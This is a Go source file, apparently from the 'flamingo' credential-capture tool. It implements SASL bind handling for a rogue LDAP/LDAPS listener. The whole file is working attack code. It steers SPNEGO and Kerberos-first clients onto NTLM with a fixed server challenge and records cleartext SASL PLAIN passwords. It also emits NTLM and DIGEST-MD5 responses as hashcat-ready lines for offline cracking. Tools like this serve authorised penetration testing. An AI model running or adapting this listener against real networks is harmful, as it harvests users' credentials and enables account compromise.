package flamingo

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"maps"
	"net"
	"strconv"
	"strings"

	"github.com/atredispartners/flamingo/pkg/ldap"
	log "github.com/sirupsen/logrus"
)

// SASL bind capture for the LDAP and LDAPS listeners.
//
// A simple bind hands over a cleartext password in one message, but Windows
// and most directory-aware software bind with SASL instead, so the binds worth
// capturing arrive as GSS-SPNEGO/NTLM, PLAIN or DIGEST-MD5. The vendored
// server refuses anything it cannot route; ConfLDAP implements ldap.SASLBinder
// so those binds reach this file.
//
// Every mechanism here is stateless. NTLM answers with the fixed server
// challenge from NTLMConf, so an AUTHENTICATE message is self-contained, and
// the DIGEST-MD5 response echoes every parameter its digest was computed over.
// Nothing therefore has to be remembered between the round trips of one bind,
// which keeps a half-finished exchange from holding memory for the life of a
// connection.

// SASL mechanism names this listener answers.
const (
	ldapSASLPlain  = "PLAIN"
	ldapSASLDigest = "DIGEST-MD5"
	ldapSASLSPNEGO = "GSS-SPNEGO"
	ldapSASLGSSAPI = "GSSAPI"
	ldapSASLNTLM   = "NTLM"
)

// ldapSASLMaxCreds caps the SASL credential blob this listener will look at.
// The vendored BER reader already refuses anything over a megabyte; this is a
// much tighter bound on what any real NTLM or DIGEST-MD5 message needs.
const ldapSASLMaxCreds = 64 * 1024

// BindSASL captures a SASL bind. It implements ldap.SASLBinder: the result
// code becomes the bind response, and serverSaslCreds is the server's half of
// a mechanism that takes more than one round trip. No credential is ever
// accepted — a captured bind is answered with invalidCredentials.
func (c *ConfLDAP) BindSASL(bindDN string, mechanism string, credentials []byte, conn net.Conn) (ldap.LDAPResultCode, []byte, error) {
	if len(credentials) > ldapSASLMaxCreds {
		log.Debugf("%s oversized SASL credential (%d bytes) from %s", c.proto(), len(credentials), conn.RemoteAddr())
		return ldap.LDAPResultInvalidCredentials, nil, nil
	}

	normalized := strings.ToUpper(strings.TrimSpace(mechanism))
	switch normalized {
	case ldapSASLSPNEGO, ldapSASLGSSAPI, ldapSASLNTLM:
		return c.saslNTLM(mechanism, normalized, credentials, conn)
	case ldapSASLPlain:
		return c.saslPlain(bindDN, credentials, conn)
	case ldapSASLDigest:
		return c.saslDigestMD5(credentials, conn)
	}

	log.Debugf("%s unsupported SASL mechanism %q from %s", c.proto(), mechanism, conn.RemoteAddr())
	return ldap.LDAPResultAuthMethodNotSupported, nil, nil
}

// saslNTLM runs the NTLM half of a GSS-SPNEGO, GSSAPI or raw NTLM bind. The
// client's NEGOTIATE is answered with a CHALLENGE under saslBindInProgress,
// and its AUTHENTICATE is recorded and then refused.
func (c *ConfLDAP) saslNTLM(mechanism string, normalized string, token []byte, conn net.Conn) (ldap.LDAPResultCode, []byte, error) {
	wrapped := ldapIsSPNEGO(token)
	msg := FindNTLMSSP(token)
	if msg == nil {
		switch {
		case normalized == ldapSASLSPNEGO:
			// A SPNEGO client that opened with Kerberos, with an empty
			// token, or with a mech list we cannot read is offered
			// NTLMSSP as the selected mechanism and asked to try
			// again: accept-incomplete with a supportedMech and no
			// response token of our own. That is what pushes a
			// Kerberos-first client onto the path the rest of
			// flamingo is waiting on.
			return ldap.LDAPResultSaslBindInProgress, ldapSPNEGOSelectNTLM(), nil
		case normalized == ldapSASLNTLM && len(token) == 0:
			// No initial response under a bare NTLM mechanism: ask
			// for one with an empty challenge.
			return ldap.LDAPResultSaslBindInProgress, nil, nil
		}
		// A raw GSSAPI bind is Kerberos, which this listener does not
		// speak. Refusing the mechanism outright is what makes a client
		// fall back to one that is captured.
		log.Debugf("%s SASL %s token carries no NTLMSSP message from %s", c.proto(), mechanism, conn.RemoteAddr())
		return ldap.LDAPResultAuthMethodNotSupported, nil, nil
	}

	switch NTLMMessageType(msg) {
	case NTLMTypeNegotiate:
		flags, _ := ParseNTLMNegotiate(msg)
		challenge := NTLMChallengeMessage(flags)
		if wrapped {
			// Answer in the same shape the client asked in: a SPNEGO
			// client wants the CHALLENGE inside a negTokenResp, while
			// ldap3 and friends send and expect bare NTLMSSP messages.
			challenge = smbSPNEGONegTokenResp(challenge)
		}
		return ldap.LDAPResultSaslBindInProgress, challenge, nil

	case NTLMTypeAuthenticate:
		auth, err := ParseNTLMAuthenticate(msg)
		if err != nil {
			log.Debugf("%s malformed NTLM AUTHENTICATE from %s: %s", c.proto(), conn.RemoteAddr(), err)
			return ldap.LDAPResultInvalidCredentials, nil, nil
		}
		fields := map[string]string{
			"username":     auth.User,
			"domain":       auth.Domain,
			"workstation":  auth.Workstation,
			"ntlm_version": auth.NTLMVersion(),
		}
		if line, mode := NTLMHashcat(auth); line != "" {
			fields["hashcat"] = line
			fields["hashcat_mode"] = strconv.Itoa(mode)
		}
		if auth.Version != "" {
			fields["client_version"] = auth.Version
		}
		c.recordSASL(conn, "NTLMSSP", mechanism, fields)
		return ldap.LDAPResultInvalidCredentials, nil, nil
	}

	log.Debugf("%s unexpected NTLMSSP message type %d from %s", c.proto(), NTLMMessageType(msg), conn.RemoteAddr())
	return ldap.LDAPResultInappropriateAuthentication, nil, nil
}

// saslPlain captures a SASL PLAIN bind, whose credential is the cleartext
// "authzid NUL authcid NUL password" of RFC 4616.
func (c *ConfLDAP) saslPlain(bindDN string, creds []byte, conn net.Conn) (ldap.LDAPResultCode, []byte, error) {
	if len(creds) == 0 {
		// No initial response: challenge with an empty one, as a server
		// does for a client that waits to be asked.
		return ldap.LDAPResultSaslBindInProgress, nil, nil
	}

	parts := bytes.SplitN(creds, []byte{0}, 3)
	if len(parts) != 3 {
		log.Debugf("%s malformed SASL PLAIN credential from %s", c.proto(), conn.RemoteAddr())
		return ldap.LDAPResultInvalidCredentials, nil, nil
	}
	authzid, username, password := string(parts[0]), string(parts[1]), string(parts[2])
	if username == "" {
		// An empty authentication identity means the authorization
		// identity is the account being named.
		username = authzid
	}

	fields := map[string]string{
		"username": username,
		"password": password,
	}
	if authzid != "" && authzid != username {
		fields["authzid"] = authzid
	}
	if bindDN != "" {
		fields["bind_dn"] = bindDN
	}
	c.recordSASL(conn, "SASL PLAIN", ldapSASLPlain, fields)
	return ldap.LDAPResultInvalidCredentials, nil, nil
}

// saslDigestMD5 captures a SASL DIGEST-MD5 bind (RFC 2831). An empty
// credential is the start of the exchange and gets a challenge; the response
// to it is recorded as a crackable digest line and then refused.
func (c *ConfLDAP) saslDigestMD5(creds []byte, conn net.Conn) (ldap.LDAPResultCode, []byte, error) {
	if len(creds) == 0 {
		return ldap.LDAPResultSaslBindInProgress, ldapDigestChallenge(), nil
	}

	p := ldapDigestParams(string(creds))
	if p["response"] == "" || p["username"] == "" {
		log.Debugf("%s malformed SASL DIGEST-MD5 response from %s", c.proto(), conn.RemoteAddr())
		return ldap.LDAPResultInvalidCredentials, nil, nil
	}
	qop := p["qop"]
	if qop == "" {
		qop = "auth"
	}

	// The response digest is computed over the realm, nonce, cnonce, nonce
	// count, qop and digest-uri the client echoes here, so the line carries
	// everything an offline attack needs.
	fields := map[string]string{
		"username": p["username"],
		"hashcat": fmt.Sprintf("%s:$sasl$DIGEST-MD5$%s$%s$%s$%s$%s$%s$%s",
			p["username"], p["realm"], p["nonce"], p["cnonce"], p["nc"], qop,
			p["digest-uri"], p["response"]),
	}
	if p["realm"] != "" {
		fields["domain"] = p["realm"]
	}
	c.recordSASL(conn, "SASL DIGEST-MD5", ldapSASLDigest, fields)
	return ldap.LDAPResultInvalidCredentials, nil, nil
}

// recordSASL writes a captured SASL credential, adding the fields every
// listener reports.
func (c *ConfLDAP) recordSASL(conn net.Conn, method string, mechanism string, fields map[string]string) {
	rec := map[string]string{
		"_server":        fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
		"method":         method,
		"sasl_mechanism": mechanism,
	}
	maps.Copy(rec, fields)
	c.RecordWriter.Record("credential", c.proto(), conn.RemoteAddr().String(), rec)
}

// ldapDigestChallenge builds a DIGEST-MD5 server challenge naming the
// configured identity and a fresh nonce.
func ldapDigestChallenge() []byte {
	realm := NTLMConf.DNSDomainName
	if realm == "" {
		realm = NTLMConf.NetBIOSDomainName
	}
	var nonce [16]byte
	if _, err := rand.Read(nonce[:]); err != nil {
		// crypto/rand does not fail in practice; a predictable nonce
		// would only weaken a credential we never accept anyway.
		copy(nonce[:], "flamingo-nonce--")
	}
	return []byte(fmt.Sprintf(`realm="%s",nonce="%s",qop="auth",charset=utf-8,algorithm=md5-sess`,
		ldapDigestQuote(realm), base64.StdEncoding.EncodeToString(nonce[:])))
}

// ldapDigestQuote escapes a value for a quoted DIGEST-MD5 directive.
func ldapDigestQuote(s string) string {
	return strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(s)
}

// ldapDigestParams splits a DIGEST-MD5 directive list into its key/value
// pairs. A value may be quoted, and a quoted value may contain commas and
// backslash escapes. Every loop advances, so malformed input terminates.
func ldapDigestParams(s string) map[string]string {
	out := make(map[string]string)
	for i := 0; i < len(s); {
		for i < len(s) && (s[i] == ',' || s[i] == ' ' || s[i] == '\t') {
			i++
		}
		start := i
		for i < len(s) && s[i] != '=' && s[i] != ',' {
			i++
		}
		if i >= len(s) || s[i] != '=' {
			break
		}
		key := strings.ToLower(strings.TrimSpace(s[start:i]))
		i++ // the '='

		var val strings.Builder
		if i < len(s) && s[i] == '"' {
			i++
			for i < len(s) && s[i] != '"' {
				if s[i] == '\\' && i+1 < len(s) {
					i++
				}
				val.WriteByte(s[i])
				i++
			}
			if i < len(s) {
				i++ // the closing quote
			}
		} else {
			for i < len(s) && s[i] != ',' {
				val.WriteByte(s[i])
				i++
			}
		}
		if key != "" {
			out[key] = strings.TrimSpace(val.String())
		}
	}
	return out
}

// ldapIsSPNEGO reports whether tok looks like a GSS-API or SPNEGO token rather
// than a bare NTLMSSP message: a GSS-API InitialContextToken, a bare
// negTokenInit, or a negTokenResp.
func ldapIsSPNEGO(tok []byte) bool {
	if len(tok) == 0 {
		return false
	}
	switch tok[0] {
	case 0x60, 0xa0, 0xa1:
		return true
	}
	return false
}

// ldapSPNEGOSelectNTLM builds a negTokenResp that names NTLMSSP as the
// selected mechanism and carries no token of its own, which asks a client that
// offered something else to start an NTLM exchange.
func ldapSPNEGOSelectNTLM() []byte {
	body := smbDER(0xa0, smbDER(0x0a, []byte{0x01})) // negResult: accept-incomplete
	body = append(body, smbDER(0xa1, smbDER(0x06, smbMechNTLMSSP))...)
	return smbDER(0xa1, smbDER(0x30, body))
}
